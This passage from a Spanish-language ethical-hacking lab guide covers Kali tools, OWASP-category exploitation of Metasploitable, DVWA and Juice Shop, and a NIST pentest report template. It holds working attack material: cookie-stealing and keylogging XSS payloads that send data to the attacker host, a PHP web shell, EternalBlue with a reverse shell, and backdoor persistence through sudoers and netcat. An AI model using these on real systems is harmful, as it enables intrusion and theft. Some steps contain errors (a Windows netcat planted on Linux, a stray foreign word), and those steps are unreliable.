# Escaneo TCP completo
nmap -sT -p- -A 192.168.56.102

# Escaneo UDP
nmap -sU -p- 192.168.56.102

# Escaneo con deteccion de servicios
nmap -sV 192.168.56.102

# Escaneo con scripts de vulnerabilidades
nmap --script vuln 192.168.56.102

# Escaneo de vulnerabilidades especificas
nmap --script smb-vuln-ms17-010 192.168.56.103
```

### 8.4. Fase 3: Enumeracion

**Objetivo:** Extraer informacion detallada de los servicios identificados.

```bash
# Enumerar SMB
enum4linux 192.168.56.102

# Enumerar HTTP
nikto -h http://192.168.56.102

# Enumerar FTP
hydra -l ftp -P /usr/share/wordlists/rockyou.txt ftp://192.168.56.102

# Enumerar SNMP
snmpwalk -c public -v1 192.168.56.102
```

### 8.5. Fase 4: Explotacion

**Objetivo:** Aprovechar las vulnerabilidades encontradas para obtener acceso.

```bash
# Usar Metasploit Framework
msfconsole

# Dentro de msfconsole:
search exploit_name
use exploit/path/to/exploit
show options
set RHOSTS 192.168.56.102
set RPORT 445
exploit

# Con searchsploit (buscar exploits de exploit-db)
searchsploit vsftpd 2.3.4
searchsploit samba 3.0.20
```

### 8.6. Fase 5: Acceso y Mantenimiento

**Objetivo:** Consolidar el acceso obtenido y escalar privilegios.

```bash
# Dentro de meterpreter:
shell
# Obtener shell

# Escalada de privilegios en Linux
uname -a
cat /etc/issue
find / -perm -4000 2>/dev/null

# Escalada de privilegios en Windows
systeminfo
whoami /priv
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### 8.7. Fase 6: Reportes

**Objetivo:** Documentar hallazgos de manera profesional.

---

## 9. Herramientas de Kali Linux

### 9.1. Nmap - Mapeo de Red y Escaneo de Puertos

**Descripcion:** La herramienta de exploracion de red y descubrimiento de hosts mas utilizada del mundo. Permite descubrir hosts, puertos abiertos, servicios y sistemas operativos.

**Comandos Fundamentales:**

```bash
# Escaneo basico de un host
nmap 192.168.56.102

# Escaneo de rango de red completo
nmap 192.168.56.0/24

# Escaneo de puertos especificos
nmap -p 22,80,443,3306 192.168.56.102

# Escaneo de todos los puertos
nmap -p- 192.168.56.102

# Escaneo con deteccion de servicios y versiones
nmap -sV 192.168.56.102

# Escaneo con deteccion de SO
nmap -O 192.168.56.102

# Escaneo agresivo (todas las opciones)
nmap -A 192.168.56.102

# Escaneo silencioso (syn scan, menos detectable)
nmap -sS 192.168.56.102

# Escaneo UDP
nmap -sU 192.168.56.102

# Escaneo con scripts de vulnerabilidades
nmap --script vuln 192.168.56.102

# Escaneo con timing (0=paranoico, 5=locooo)
nmap -T4 192.168.56.102

# Guardar resultados en diferentes formatos
nmap -oA resultado_scan 192.168.56.102
# -oN normal.txt
# -oX xml.xml
# -oG grepeable.txt
```

**Ejemplos Prácticos con Metasploitable:**

```bash
# 1. Descubrir todos los hosts en la red
nmap -sn 192.168.56.0/24

# 2. Identificar SO y servicios de Metasploitable 2
nmap -A -T4 192.168.56.102

# 3. Buscar vulnerabilidades conocidas en puertos abiertos
nmap --script "vuln" 192.168.56.102

# 4. Escanear todos los puertos rapidamente
nmap -p- -T5 192.168.56.102

# 5. Usar scripts de enumeration de servicios
nmap --script=banner,http-enum,ftp-anon 192.168.56.102

# 6. Escaneo para EternalBlue (MS17-010)
nmap -p445 --script=smb-vuln-ms17-010 192.168.56.103
```

**Interpretacion de Resultados:**

```
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 2.3.4
22/tcp   open  ssh      OpenSSH 4.7p1
80/tcp   open  http     Apache httpd 2.2.8
445/tcp  open  netbios-ssn Samba smbd 3.X
3306/tcp open  mysql    MySQL 5.0.51a

STATE:
- open: Puerto aceptando conexiones
- filtered: Firewall filtrando el puerto
- closed: Puerto accesible pero sin servicio

```

### 9.2. SQLMap - Inyeccion SQL Automatizada

**Descripcion:** Herramienta para detectar y explotar vulnerabilidades de inyeccion SQL de manera automatizada.

**Conceptos Previos:**

La inyeccion SQL ocurre cuando datos proporcionados por el usuario se incorporan directamente en consultas SQL sin sanitizacion.

```sql
-- Consulta vulnerable (PHP)
SELECT * FROM users WHERE username = '$user' AND password = '$pass'

-- Si user = admin' OR '1'='1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = ''
-- Esto siempre retorna verdadero
```

**Comandos Fundamentales:**

```bash
# 1. Detectar si un parametro es vulnerable
sqlmap -u "http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"

# 2. Especificar metodo POST
sqlmap -u "http://192.168.56.102/login.php" --data="username=admin&password=admin"

# 3. Enumerar bases de datos
sqlmap -u "http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1" --dbs

# 4. Enumerar tablas de una base de datos
sqlmap -u "http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1" -D dvwa --tables

# 5. Enumerar columnas de una tabla
sqlmap -u "http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1" -D dvwa -T users --columns

# 6. Extraer datos
sqlmap -u "http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1" -D dvwa -T users --dump

# 7. Extraer todo (dbs, tablas, columnas, datos)
sqlmap -u "http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1" --all

# 8. Obtener shell interactivo
sqlmap -u "http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1" --os-shell

# 9. Escanear con cookies de autenticacion
sqlmap -u "http://192.168.56.102/admin.php?id=1" --cookie="PHPSESSID=abc123;security=low"

# 10. Usar proxy para ver trafico
sqlmap -u "http://192.168.56.102/sqli.php?id=1" --proxy=http://127.0.0.1:8080

# 11. Nivel de riesgo y verbosidad
sqlmap -u "http://192.168.56.102/sqli.php?id=1" --level=5 --risk=3 -v 3
```

**Ejemplos Prácticos con DVWA:**

```bash
# Primero configurar DVWA en Kali o Metasploitable
# DVWA normalmente esta en /etc/dvwa o hay que instalarlo

# 1. Configurar cookie desde Burp Suite o navegador
# Identificar que parametro es vulnerable

# 2. Probar inyeccion basica
sqlmap -u "http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=tusession;security=low" \
  --dbs

# 3. Encontrar tablas
sqlmap -u "http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=tusession;security=low" \
  -D dvwa --tables

# 4. Extraer usuarios y passwords
sqlmap -u "http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=tusession;security=low" \
  -D dvwa -T users --dump
```

### 9.3. Metasploit Framework

**Descripcion:** Framework de explotacion mas utilizado. Contiene cientos de exploits y payloads.

```bash
# Iniciar msfconsole
msfconsole

# Comandos basicos dentro de msfconsole:
# ============================

# Buscar exploit
search type:exploit name:vsftpd

# Buscar por modulo
search name:mysql

# Seleccionar exploit
use exploit/unix/ftp/vsftpd_234_backdoor

# Ver opciones
show options

# Configurar parametros
set RHOSTS 192.168.56.102
set RPORT 21
set PAYLOAD cmd/unix/interact
show options

# Ejecutar exploit
exploit
# o
run

# Buscar y usar auxiliar (scanner)
search type:auxiliary name:smb
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.56.102
run

# Listar workspaces
workspace

# Listar todas las sesiones
sessions -l

# Interactuar con una sesion
sessions -i 1

# Ejecutar comando en sesion meterpreter
shell

# Subir archivo
upload /path/to/file

# Descargar archivo
download file.txt

# Ver informacion del sistema
sysinfo

# Escalada de privilegios (Windows)
getsystem

# Escalada de privilegios (Linux)
# Dentro de shell:
sudo -l
# Buscar archivos con permisos SUID:
find / -perm -4000 2>/dev/null
```

### 9.4. Burp Suite - Analisis de Aplicaciones Web

**Descripcion:** Plataforma grafica para pruebas de seguridad web. Permite interceptar, modificar y analizar peticiones HTTP.

```bash
# Iniciar Burp Suite
burpsuite

# O desde terminal para version gratuita:
burpsuite &
```

**Flujo de trabajo:**

```
1. Configurar proxy del navegador (127.0.0.1:8080)
2. Interceptar peticiones
3. Enviar a Repeater para modificar peticiones
4. Enviar a Intruder para ataques automatizados
5. Analizar respuestas
```

**Comandos en terminal:**

```bash
# Iniciar con configuracion especifica
burpsuite --proxy-host=127.0.0.1 --proxy-port=8080 &

# Configurar proxy del navegador
# Firefox > Preferences > Network Settings > Manual Proxy
# HTTP Proxy: 127.0.0.1
# Port: 8080
# Marcar "Use this proxy for all protocols"
```

### 9.5. Hydra - Ataques de Fuerza Bruta

**Descripcion:** Herramienta para realizar ataques de fuerza bruta contra servicios de autenticacion.

```bash
# Ataque SSH
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.104 -t 4

# Ataque FTP
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ftp://192.168.56.102

# Ataque HTTP Form
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.102 http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# Ataque SMB
hydra -l administrator -P /usr/share/wordlists/rockyou.txt smb://192.168.56.102

# Modo paralelo
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.104 -t 8 -V

# Guardar resultados
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.104 -o resultado.txt
```

### 9.6. John the Ripper - Crackeo de Contrasenas

```bash
# Crackear hash de archivo passwd
john /etc/shadow --wordlist=/usr/share/wordlists/rockyou.txt

# Ver progresion
john --show /etc/shadow

# Formato especifico
john --format=md5crypt --wordlist=rockyou.txt hashes.txt

# Crackear hashes de Windows (SAM)
john --format=nt hashes.txt
```

### 9.7. Wireshark - Analisis de Trafico de Red

```bash
# Iniciar desde terminal (captura por interfaz)
wireshark &

# Captura desde terminal
tshark -i eth0 -w captura.pcap

# Filtrar trafico HTTP
tshark -r captura.pcap -Y "http.request.method == GET"

# Ver conversaciones
tshark -r captura.pcap -q -z conv,ip
```

### 9.8. Aircrack-ng - Seguridad WiFi

```bash
# Poner interfaz en modo monitor
airmon-ng start wlan0

# Escanear redes
airodump-ng wlan0mon

# Capturar handshake
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w captura wlan0mon

# Desautenticar clientes (para capturar handshake)
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Crackear clave WPA
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF captura*.cap
```

### 9.9. Hashcat - Crackeo de Contrasenas GPU

```bash
# Crackear MD5 con diccionario
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# Crackear SHA256 con reglas
hashcat -m 1400 -a 0 hash.txt wordlist.txt -r rules/best64.rule

# Ataque combinator
hashcat -m 0 -a 1 hash.txt wordlist1.txt wordlist2.txt

# Ataque de fuerza bruta
hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a?a
```

---

## 10. Explotacion de Vulnerabilidades - Top 10 por Categoria

### 10.1. Inyeccion SQL

**Vulnerabilidad:** Permite insertar codigo SQL malicioso en consultas.

**Explotacion en Metasploitable 2:**

```bash
# Paso 1: Identificar la aplicacion vulnerable
# DVWA esta preinstalado en algunas versiones de Metasploitable
# O instalar DVWA manualmente

# Paso 2: Escanear con SQLMap
sqlmap -u "http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=session; security=low" --batch --dbs

# Paso 3: Enumerar base de datos
sqlmap -u "http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=session; security=low" --current-db

# Paso 4: Enumerar tablas
sqlmap -u "http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=session; security=low" -D dvwa --tables

# Paso 5: Extraer usuarios
sqlmap -u "http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=session; security=low" -D dvwa -T users --dump

# Paso 6: Obtener shell del sistema
sqlmap -u "http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=session; security=low" --os-shell
```

**Inyeccion SQL Manual:**

```bash
# Detectar vulnerabilidad (la pagina cambia al injector unquote)
# Parametros típicos vulnerables:
# ?id=1' OR '1'='1
# ?id=1" OR "1"="1
# ?id=1' OR 1=1--

# En DVWA (nivel bajo):
# Username: admin' OR '1'='1
# Password: cualquiercosa

# Union based injection:
# ?id=1' UNION SELECT 1,2,3--
# ?id=1' UNION SELECT version(),user(),database()--
# ?id=1' UNION SELECT table_name,2 FROM information_schema.tables--

# Leer archivos del sistema:
# ?id=1' UNION SELECT LOAD_FILE('/etc/passwd'),2--
```

### 10.2. Inyeccion de Comandos (Command Injection)

**Vulnerabilidad:** Permite ejecutar comandos del sistema operativo.

**Explotacion:**

```bash
# Desde la web o aplicacion vulnerable
# probar:
# | whoami
# ; ls -la
# && cat /etc/passwd
# `id`

# Con Metasploit:
msfconsole
search type:exploit cmd_injection
use exploit/multi/http/apache_commons_exec
set RHOSTS 192.168.56.102
set RPORT 8080
set TARGETURI /
exploit

# Shell interactiva
shell
python3 -c "import pty;pty.spawn('/bin/bash')"
```

### 10.3. Cross-Site Scripting (XSS)

**Vulnerabilidad:** Permite inyectar codigo JavaScript en paginas vistas por otros usuarios.

**Tipos:**
- Reflejado: El script solo se ejecuta en la peticion actual
- Almacenado: El script se guarda en el servidor
- DOM: Manipulacion del DOM en el lado del cliente

**Explotacion en Juice Shop:**

```bash
# XSS Reflejado
# En el campo de busqueda:
<script>alert('XSS')</script>

# Robo de cookies:
<script>document.location='http://192.168.56.101:8080/?c='+document.cookie</script>

# Keylogger:
<script>document.onkeypress=function(e){new Image().src='http://192.168.56.101:8080/k?k='+e.key}</script>

# XSS Almacenado en reviews de Juice Shop:
# Escribir en review de producto:
<img src=x onerror="fetch('http://192.168.56.101:8080/steal?c='+btoa(document.cookie))">
```

**Desde Kali - Configurar servidor de recoleccion:**

```bash
# Crear script de recoleccion en Kali
mkdir -p /var/www/html/steal
nano /var/www/html/steal/collect.py

# Contenido del script:
nano /var/www/html/steal/index.php
<?php
$cookie = $_GET['c'];
$log = fopen("cookies.txt", "a");
fwrite($log, $cookie . "\n");
fclose($log);
?>

# Iniciar servidor PHP
sudo service apache2 start
sudo chmod 666 /var/www/html/steal/cookies.txt

# Con Burp Suite:
# 1. Interceptar peticion
# 2. Enviar a Repeater
# 3. Modificar parametros con payloads XSS
# 4. Analizar respuesta
```

### 10.4. Broken Authentication

**Vulnerabilidad:** Fallos en el sistema de autenticacion y sesion.

**Explotacion:**

```bash
# Enumerar usuarios via respuesta diferencial
# Intentar login con usuario existente vs inexistente

# Ataque de fuerza bruta a login
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.102 http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid" -V

# Sesiones debiles o predecibles
# Inspeccionar cookies con Burp Suite
# Cookie: PHPSESSID=12345 (numerico, predecible)

# Session hijacking
# Con XSS del punto anterior, robar cookie de admin

# Password reset predecible
# Si el token es fijo o basado en tiempo predecible
```

### 10.5. Sensitive Data Exposure

**Vulnerabilidad:** Datos sensibles sin cifrar o mal configurados.

**Explotacion:**

```bash
# Enumerar archivos de configuracion expuestos
curl http://192.168.56.102/config.php
curl http://192.168.56.102/.git/config
curl http://192.168.56.102/.env
curl http://192.168.56.102/backup.sql

# Buscar archivos de backup con dirbuster o wfuzz
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt \
  --hc 404 http://192.168.56.102/FUZZ

# Base de datos expuesta (Metasploitable 3 - Elasticsearch)
curl http://192.168.56.103:9200/_cat/indices?v
curl http://192.168.56.103:9200/_nodes?pretty
curl http://192.168.56.103:9200/_search?q=password

# MongoDB sin autenticacion
nmap -p 27017 192.168.56.103
mongo --host 192.168.56.103
show dbs
use admin
db.users.find()
```

### 10.6. XML External Entities (XXE)

**Vulnerabilidad:** Procesamiento de XML que permite acceder a recursos externos.

**Explotacion:**

```bash
# Crear payload XXE
cat > xxe.xml << 'EOF'
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<foo>&xxe;</foo>
EOF

# Enviar peticion
curl -X POST \
  -H "Content-Type: text/xml" \
  -d @xxe.xml \
  http://192.168.56.102/upload

# XXE para lectura de archivos sensibles
cat > xxe_sensitive.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/config.php">
]>
<foo>&xxe;</foo>
EOF

# SSRF via XXE (acceder a servicios internos)
cat > xxe_ssrf.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://localhost:6379/">
]>
<foo>&xxe;</foo>
EOF
```

### 10.7. Broken Access Control

**Vulnerabilidad:** Usuarios pueden acceder a funciones o datos que no deberian.

**Explotacion:**

```bash
# IDOR - Referencias directas a objetos
# Cambiar IDs en URL para acceder a otros registros
# Ver perfil 1 -> Ver perfil 2 -> Ver perfil 3

# Acceso a panel de admin
curl http://192.168.56.102/admin/
curl http://192.168.56.102/api/admin/users

# Bypass de restricciones con Burp Suite:
# Cambiar metodo HTTP (GET -> POST)
# Modificar Content-Type
# Cambiar Referer header
# Modificar cookies de sesion

# Acceso a archivos protegidos
# /protected/file.pdf -> /download?file=../../etc/passwd
# /admin/dashboard -> /admin/dashboard/../../../robots.txt

# En Juice Shop:
# Acceder a回购 historico de otro usuario
curl http://192.168.56.102/rest/products/1/reviews
# Cambiar X-User-Id header
```

### 10.8. Security Misconfiguration

**Vulnerabilidad:** Configuraciones incompletas o por defecto.

**Explotacion:**

```bash
# Escaneo con Nikto
nikto -h http://192.168.56.102

# Verificar opciones por defecto
# Paneles de admin expuestos
curl http://192.168.56.102/admin/
curl http://192.168.56.102/phpmyadmin/
curl http://192.168.56.102/console/

# Cabeceras de seguridad faltantes
curl -I http://192.168.56.102

# Headers de respuesta esperados:
# X-Frame-Options
# X-Content-Type-Options
# Strict-Transport-Security
# Content-Security-Policy
# X-XSS-Protection

# Verificar versiones de servicios (para exploits conocidos)
nmap -sV 192.168.56.102
# vsftpd 2.3.4 -> exploit disponible
# Samba 3.0.20 -> exploit disponible
```

### 10.9. Cross-Site Request Forgery (CSRF)

**Vulnerabilidad:** Permite forzar a usuarios autenticados a realizar acciones no deseadas.

**Explotacion:**

```bash
# Crear pagina maliciosa
cat > csrf_attack.html << 'EOF'
<!DOCTYPE html>
<html>
<body>
  <h1>Tu navegador esta siendo actualizado...</h1>
  <script>
    // Cambiar email del usuario sin su consentimiento
    fetch('http://192.168.56.102/api/user/email', {
      method: 'POST',
      credentials: 'include',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({email: 'hacker@evil.com'})
    });
  </script>
</body>
</html>
EOF

# Ejecutar en navegador de la victima
# Cuando la victima esta logueada en la app vulnerable
```

### 10.10. Using Components with Known Vulnerabilities

**Vulnerabilidad:** Uso de software con vulnerabilidades conocidas.

**Explotacion:**

```bash
# Usar searchsploit para buscar vulnerabilidades
searchsploit vsftpd 2.3.4
searchsploit samba 3.0.20
searchsploit tomcat

# Usar Metasploit
msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.102
exploit

# Metasploitable 2 - vsftpd backdoor
# Puerto 21, exploit automatico

# Metasploitable 3 - SMB (EternalBlue)
search ms17_010
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.56.103
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.101
exploit
```

---

## 11. Escenarios de Explotacion Completos

### Escenario 1: Metasploitable 2 desde Kali

```bash
# 1. RECONOCIMIENTO
# ---------
# Ver todos los hosts disponibles
nmap -sn 192.168.56.0/24

# 2. ESCANEO
# ---------
# Escaneo completo de Metasploitable 2
nmap -sV -sC -p- -A 192.168.56.102 -oA metasploitable2_scan

# Puerto 21 (vsftpd 2.3.4) es vulnerable

# 3. ENUMERACION
# ---------
# Verificar version exacta
nmap -sV -p21 192.168.56.102

# Intentar acceso FTP anonimo
ftp 192.168.56.102
# usuario: anonymous
# password: anonymous

# 4. EXPLOTACION con Metasploit
# ---------
msfconsole -q

search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.102
exploit

# Deberias obtener shell de root
whoami
id

# 5. MANTENER ACCESO
# ---------
# Agregar usuario
useradd -m -s /bin/bash backdoor
passwd backdoor
echo "backdoor ALL=(ALL:ALL) ALL" >> /etc/sudoers

# Subir netcat para shell reverso
# En Kali:
cp /usr/share/windows-binaries/nc.exe /tmp/nc.exe
python3 -m http.server 80

# En Metasploitable (shell):
cd /tmp
wget http://192.168.56.101/nc.exe
chmod +x nc.exe

# Configurar persistencia (agregar a rc.local)
echo "/tmp/nc.exe -Ldp 4444 -e cmd.exe" >> /etc/rc.local

# 6. ESCALADA DE PRIVILEGIOS
# ---------
# Ya somos root en este caso, pero si no:
find / -perm -4000 2>/dev/null
cat /etc/exports
# Buscar configuraciones NFS vulnerables
showmount -e 192.168.56.102
```

### Escenario 2: Metasploitable 3 - EternalBlue

```bash
# 1. Verificar que SMB esta expuesto
nmap -p 445 192.168.56.103

# 2. Verificar si es vulnerable a MS17-010
msfconsole -q
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.56.103
run

# 3. Explotar
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.56.103
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.101
set LPORT 4444
exploit

# 4. En meterpreter:
meterpreter > sysinfo
meterpreter > getuid
meterpreter > shell
# Estamos en Windows como SYSTEM
```

### Escenario 3: DVWA en Metasploitable 2

```bash
# 1. Primero instalar DVWA si no esta
cd /var/www
git clone https://github.com/digininja/DVWA.git
cd DVWA
chmod 755 config/
chmod 666 config/config.inc.php

# Editar configuracion
nano config/config.inc.php

# Configurar MySQL
service mysql start
mysql -u root
CREATE DATABASE dvwa;
GRANT ALL ON dvwa.* TO 'dvwa'@'localhost';
FLUSH PRIVILEGES;
EXIT;

# Acceder a setup
firefox http://192.168.56.102/dvwa/setup.php
# Click "Create / Reset Database"

# 2. Explotar SQL Injection
# Nivel de seguridad bajo
sqlmap -u "http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=abc123; security=low" \
  --dbs

# 3. Explotar XSS
# En campo de nombre o comentarios:
<script>alert(document.cookie)</script>

# 4. Explotar Command Injection
# En ping:
127.0.0.1; cat /etc/passwd

# 5. File Upload
# Subir shell PHP
cat > shell.php << 'EOF'
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>
EOF

# Subir via DVWA file upload
# Acceder a shell:
curl "http://192.168.56.102/hackable/uploads/shell.php?cmd=whoami"
```

### Escenario 4: OWASP Juice Shop

```bash
# 1. Acceder a la aplicacion
firefox http://192.168.56.101:3000

# 2. Explorar API
curl http://192.168.56.101:3000/api/Products
curl http://192.168.56.101:3000/rest/products/1

# 3. Registrar usuario
curl -X POST http://192.168.56.101:3000/api/Users \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"test123"}'

# 4. SQL Injection en busqueda
# En el campo de busqueda:
' OR 1=1--

# 5. Bypass de autenticacion
# Login con email de admin
# Usar SQLi en email:
admin'--

# 6. XSS en reviews
# Escribir review con:
<img src=x onerror=alert('XSS')>

# 7. JWT manipulation (si esta configurado)
# Decodificar JWT
echo "eyJ..." | cut -d. -f2 | base64 -d

# Modificar y re-firmar

# 8. Path traversal
# En parametros de archivo:
../../etc/passwd
```

---

## 12. Plantilla de Informe de Hacking Etico (NIST)

### 12.1. Introduccion al Estandar NIST

El National Institute of Standards and Technology (NIST) proporciona marcos para la gestion de ciberseguridad. Para informes de pentesting, usamos principalmente:

- **NIST SP 800-53:** Controles de seguridad
- **NIST CSF:** Cybersecurity Framework
- **SP 800-115:** Guia tecnica para evaluacion de seguridad

### 12.2. Estructura del Informe

```markdown
================================================================================
INFORME DE PRUEBA DE PENETRACION
================================================================================

1. INFORMACION EJECUTIVA
-----------------------
1.1 Resumen
   Breve descripcion del alcance y hallazgos principales.

1.2 Alcance
   - Objetivo: Evaluacion de seguridad de la red de laboratorio
   - Objetivo(s): 192.168.56.0/24
   - Duracion: [FECHA INICIO] - [FECHA FIN]
   - Metodologia: OWASP, NIST SP 800-115

1.3 Hallazgos Resumidos
   | Severidad    | Cantidad |
   |--------------|----------|
   | Critico      | X        |
   | Alto         | X        |
   | Medio        | X        |
   | Bajo         | X        |
   | Informativo  | X        |

1.4 Riesgo General
   [CRITICO/ALTO/MEDIO/BAJO] - Justificacion breve

1.5 Recomendacion General
   Breve descripcion de acciones recomendadas.


2. METODOLOGIA
--------------
2.1 Estandares Seguidos
   - NIST SP 800-115 (Technical Guide to Information Security Testing)
   - OWASP Testing Guide v4
   - PTES (Penetration Testing Execution Standard)

2.2 Fases de la Evaluacion

   | Fase              | Herramientas Principales       | Duracion |
   |--------------------|--------------------------------|----------|
   | Reconocimiento     | nmap, whois, dig, theHarvester | X horas   |
   | Escaneo            | nmap, nikto, sqlmap            | X horas   |
   | Enumeracion        | enum4linux, smbclient          | X horas   |
   | Explotacion        | msfconsole, Burp Suite, hydra   | X horas   |
   | Documentacion      | -                              | X horas   |


3. HALLAZGOS DETALLADOS
-----------------------

HALLAZGO #1
================================================================================
Identificador:         LAB-001
Titulo:                 [Titulo de la vulnerabilidad]
Severidad:              [Critico/Alto/Medio/Bajo/Informativo]
CVSS v3.1 Score:        [X.X] (Vector: [vector completo])
CWE:                    [CWE-XXX]
CVE (si aplica):        [CVE-XXXX-XXXX]
Descripcion:            
   [Descripcion detallada de la vulnerabilidad]

Pasos de Reproduccion:
   1. [Paso 1]
   2. [Paso 2]
   3. [Paso 3]

Evidencia:
   [Screenshot o output de comandos]

Impacto:
   [Que puede hacer un atacante con esta vulnerabilidad]

Recomendacion:
   [Como mitigar o corregir la vulnerabilidad]

Referencias:
   - [Referencia 1]
   - [Referencia 2]

---

[Repetir para cada hallazgo]


4. ANALISIS DE RIESGO SEGUN NIST CSF
------------------------------------

Funcion: IDENTIFY (Identificar)
--------------------------------
| Categoria                    | Hallazgos Relacionados  |
|------------------------------|--------------------------|
| Asset Management (ID.AM)     | LAB-XXX                  |
| Business Environment (ID.BE) | LAB-XXX                  |
| Governance (ID.GV)           | LAB-XXX                  |
| Risk Assessment (ID.RA)      | LAB-XXX                  |
| Risk Management Strategy (ID.RM) | LAB-XXX               |

Funcion: PROTECT (Proteger)
---------------------------
| Categoria                    | Hallazgos Relacionados  |
|------------------------------|--------------------------|
| Identity Management (PR.AC)   | LAB-XXX                  |
| Access Control (PR.AC)        | LAB-XXX                  |
| Data Security (PR.DS)         | LAB-XXX                  |
| Information Protection (PR.IP)| LAB-XXX                  |

Funcion: DETECT (Detectar)
--------------------------
| Categoria                    | Hallazgos Relacionados  |
|------------------------------|--------------------------|
| Anomalies and Events (DE.CM) | LAB-XXX                  |
| Security Continuous Monitoring (DE.CM) | LAB-XXX         |

Funcion: RESPOND (Responder)
---------------------------
| Categoria                    | Hallazgos Relacionados  |
|------------------------------|--------------------------|
| Response Planning (RS.RP)     | LAB-XXX                  |

Funcion: RECOVER (Recuperar)
---------------------------
| Categoria                    | Hallazgos Relacionados  |
|------------------------------|--------------------------|


5. MATRIZ DE PRIORIZACION
-------------------------

Basada en CVSS y negocio:

| Prioridad | Hallazgo | CVSS | Action Timeline |
|-----------|----------|------|-----------------|
| P1        | LAB-XXX  | 9.0+ | Inmediato (<24h)|
| P2        | LAB-XXX  | 7.0+ | 1 semana        |
| P3        | LAB-XXX  | 4.0+ | 1 mes           |
| P4        | LAB-XXX  | <4.0 | 3 meses        |


6. CONCLUSIONES
---------------
[Resumen ejecutivo de conclusiones y proximos pasos recomendados]


7. ANEXOS
---------

Anexo A: Output Completo de Escaneos
Anexo B: Exploits Utilizados
Anexo C: Glosario de Terminos
Anexo D: Herramientas y Versiones

================================================================================
FIN DEL INFORME
================================================================================
```

### 12.3. Escala de Severidad CVSS v3.1

| Rango de Score | Severidad | Descripcion |
|----------------|-----------|-------------|
| 0.0 | Ninguno | Sin vulnerabilidad |
| 0.1 - 3.9 | Bajo | Impacto limitado |
| 4.0 - 6.9 | Medio | Impacto moderado |
| 7.0 - 8.9 | Alto | Impacto significativo |
| 9.0 - 10.0 | Critico | Impacto severo en todo el sistema |

### 12.4. Plantilla Resumida para Entrega Rapida

```markdown
# INFORME DE PENTESTING - [NOMBRE DEL PROYECTO]

**Fecha:** [FECHA]
**Analista:** [NOMBRE]
**Alcance:** [IPs/DOMINIOS]

## RESUMEN EJECUTIVO
[3-5 oraciones]

## HALLAZGOS CRITICOS Y DE ALTO RIESGO

### 1. [TITULO]
- **Severidad:** [CRITICO/ALTO]
- **CVSS:** [X.X]
- **Ubicacion:** [HOST/PATH]
- **Descripcion:** [1-2 oraciones]
- **Impacto:** [Que puede pasar]
- **Mitigacion:** [Como corregir]

## GRAFICO DE SEVERIDAD
[Generar con herramienta o manualmente]

## DETALLE DE VULNERABILIDADES

[Vulnerabilidad 1]
- Vulnerabilidad: [Nombre]
- Host: [IP]
- Severidad: [Nivel]
- Descripcion: [Detalle]
- Evidencia: [Output/PoC]
- Remediation: [Solucion]
- Referencia: [Links]

[Vulnerabilidad N...]

## HERRAMIENTAS UTILIZADAS
| Herramienta | Proposito | Version |
|-------------|-----------|---------|
| nmap | Escaneo de puertos | X.XX |
| Burp Suite | Analisis web | X.X |
| sqlmap | Inyeccion SQL | X.X |

